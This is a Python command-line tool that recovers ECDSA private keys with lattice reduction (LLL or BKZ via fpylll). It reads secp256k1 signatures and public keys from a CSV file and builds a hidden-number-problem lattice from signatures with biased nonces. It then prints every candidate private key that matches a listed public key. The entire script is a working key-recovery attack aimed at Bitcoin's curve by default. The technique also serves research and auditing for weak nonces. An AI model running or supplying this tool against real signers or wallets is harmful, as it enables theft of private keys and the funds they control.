#!/usr/bin/env python
# Author: Dario Clavijo (2020) 
# MIT License 

import sys
import argparse
import mmap
import gmpy2
from fpylll import IntegerMatrix, LLL, BKZ
from ecdsa import SigningKey, SECP256k1
from ecdsa.ecdsa import int_to_string

DEFAULT_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def modular_inv(a, b):
    return int(gmpy2.invert(a, b))


def normalize_pubhex(s: str) -> str:
    """Normalize pubkey hex string: strip prefix, lowercase."""
    if s is None:
        return ""
    s2 = s.strip()
    if s2.startswith("0x") or s2.startswith("0X"):
        s2 = s2[2:]
    return s2.lower()


def load_csv(filename, limit=None, mmap_flag=False):
    msgs, sigs, pubs = [], [], []
    def parse_pub(p):
        return normalize_pubhex(p)

    if mmap_flag:
        with open(filename, "r") as f:
            mapped_file = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            lines = mapped_file.splitlines()
            for n, line in enumerate(lines):
                if limit is not None and n >= limit:
                    break
                l = line.decode("utf-8").rstrip().split(",")
                if len(l) < 5:
                    continue
                tx, R, S, Z, pub = l[:5]
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(parse_pub(pub))
    else:
        with open(filename, "r") as fp:
            for n, line in enumerate(fp):
                if limit is not None and n >= limit:
                    break
                parts = line.rstrip().split(",")
                if len(parts) < 5:
                    continue
                tx, R, S, Z, pub = parts[:5]
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(parse_pub(pub))
    return msgs, sigs, pubs


def make_matrix_fpylll(msgs, sigs, B, order, integer_mode=False):
    m = len(msgs)
    if m < 1:
        raise ValueError("Need at least 1 signature to construct matrix")
    m1, m2 = m + 1, m + 2
    B2 = 1 << B
    mat = IntegerMatrix(m2, m2)

    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
    mi_sn_order = modular_inv(sn, order)
    rnsn_inv = (rn * mi_sn_order) % order
    mnsn_inv = (msgn * mi_sn_order) % order

    for i in range(m):
        mi_sigi_order = modular_inv(sigs[i][1], order)
        delta_r = (sigs[i][0] * mi_sigi_order - rnsn_inv) % order
        delta_z = (msgs[i] * mi_sigi_order - mnsn_inv) % order

        mat[i, i] = int(order)
        if integer_mode:
            # scale into integer domain
            mat[m, i] = int(order * delta_r)
            mat[m1, i] = int(order * delta_z)
        else:
            # keep smaller integers but scaled reasonably
            mat[m, i] = int(delta_r)
            mat[m1, i] = int(delta_z)

    if integer_mode:
        # keep large scaling in integer mode
        mat[m, m1] = int(B2)
    else:
        # use rounded ratio to avoid truncation artifacts
        mat[m, m1] = int(round(B2 / order)) if order != 0 else int(B2)
    mat[m1, m1] = int(B2)

    return mat


def reduce_matrix(matrix, algorithm="LLL"):
    LLL.reduction(matrix)
    if algorithm == "BKZ":
        bkz = BKZ(matrix)
        param = BKZ.Param(block_size=20)
        bkz(param)
    return matrix


def point_bytes_from_vk(vk):
    """Return uncompressed and compressed hex strings from a VerifyingKey."""
    raw = vk.to_string()
    if len(raw) != 64:
        # unexpected format - fallback
        return None, None
    x = raw[:32]
    y = raw[32:]
    x_hex = x.hex()
    y_hex = y.hex()
    uncompressed = "04" + x_hex + y_hex
    # compressed prefix depends on parity of y
    y_int = int.from_bytes(y, "big")
    prefix = "03" if (y_int & 1) else "02"
    compressed = prefix + x_hex
    return uncompressed.lower(), compressed.lower()


def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20, max_candidates=1000):
    keys = set()
    m = len(msgs)
    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]

    params = []
    for i in range(m):
        a = (rn * sigs[i][1]) % order
        b = (sn * sigs[i][0]) % order
        c = (sn * msgs[i]) % order
        d = (msgn * sigs[i][1]) % order
        cd = (c - d) % order
        ab_list = None if a == b else [((a - b) % order), ((b - a) % order)]
        params.append((b, cd, ab_list))

    # compute row norms (only first m columns contribute to norm in our design)
    row_norms = []
    for ridx in range(matrix.nrows):
        # norm over first m columns
        norm2 = 0.0
        for j in range(m):
            v = float(matrix[ridx, j])
            norm2 += v * v
        row_norms.append((norm2, ridx))
    row_norms.sort()

    checked = 0
    for _, ridx in row_norms[:max_rows]:
        if checked >= max_candidates:
            break
        row = [int(matrix[ridx, j]) for j in range(m)]
        for i, (b, cd, ab_list) in enumerate(params):
            base = (cd - (b * row[i])) % order
            if ab_list is None:
                # direct candidate
                candidate = base % order
                if 1 <= candidate < order:
                    keys.add(candidate)
            else:
                for ab in ab_list:
                    if ab:
                        try:
                            inv = modular_inv(ab, order)
                        except Exception:
                            continue
                        candidate = (base * inv) % order
                        if 1 <= candidate < order:
                            keys.add(candidate)
        checked = len(keys)
        if checked >= max_candidates:
            break

    return list(keys)


def derived_pubhexes_for_candidates(candidates):
    """Given a list of private integer candidates, derive both compressed and uncompressed pub hexes."""
    mapping = {}
    for priv in candidates:
        try:
            sk = SigningKey.from_secret_exponent(priv, curve=SECP256k1)
            vk = sk.get_verifying_key()
            uncmp, cmpd = point_bytes_from_vk(vk)
            mapping[priv] = (uncmp, cmpd)
        except Exception:
            # skip invalid privs
            continue
    return mapping


def display_keys(keys, pubkeys, show_all=False):
    pubset = set(normalize_pubhex(p) for p in pubkeys if p)
    if not pubset:
        sys.stderr.write("[!] Warning: no pubkeys given for verification.\n")

    # batch derive pubkeys
    mapping = derived_pubhexes_for_candidates(keys)
    verified = []
    for priv, (uncmp, cmpd) in mapping.items():
        if uncmp in pubset or cmpd in pubset:
            verified.append((priv, uncmp, cmpd))

    if not verified:
        if show_all:
            # show all candidates in hex
            print("Recovered candidates (not verified):")
            for k in keys:
                print(f"{k:064x}")
        else:
            print("No verified keys found.")
        return

    print("\nVerified private keys:")
    for priv, uncmp, cmpd in verified:
        print(f"priv: {priv:064x}")
        print(f"  uncompressed: {uncmp}")
        print(f"  compressed:   {cmpd}\n")


def main():
    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction (fpylll)")
    parser.add_argument("filename", help="CSV file containing ECDSA traces")
    parser.add_argument("B", type=int, help="log2 bound parameter B")
    parser.add_argument("limit", type=int, nargs="?", default=None, help="Limit number of signatures to process (optional)")
    parser.add_argument("--order", type=int, default=DEFAULT_ORDER, help="Curve order (default: secp256k1)")
    parser.add_argument("--reduction", choices=["LLL", "BKZ"], default="LLL", help="Lattice reduction algorithm")
    parser.add_argument("--mmap", action="store_true", help="Enable mmap for fast CSV access")
    parser.add_argument("--integer_mode", action="store_true", help="Scale matrix to ensure integer values")
    parser.add_argument("--max_rows", type=int, default=20, help="Max number of reduced rows to inspect")
    parser.add_argument("--max_candidates", type=int, default=1000, help="Stop after this many candidates are gathered")
    parser.add_argument("--show_all", action="store_true", help="Show all recovered candidates even if not verified")
    args = parser.parse_args()

    msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)
    sys.stderr.write(f"Using: {len(msgs)} sigs...\n")
    if len(msgs) < 2:
        sys.stderr.write("[!] Warning: fewer than 2 signatures - results may be meaningless.\n")

    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order, integer_mode=args.integer_mode)
    sys.stderr.write("Matrix constructed, starting reduction...\n")
    matrix = reduce_matrix(matrix, algorithm=args.reduction)
    sys.stderr.write("Reduction complete, extracting candidates...\n")

    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, args.order, max_rows=args.max_rows, max_candidates=args.max_candidates)
    sys.stderr.write(f"Candidates found: {len(keys)}\n")

    display_keys(keys, pubs, show_all=args.show_all)


if __name__ == "__main__":
    main()
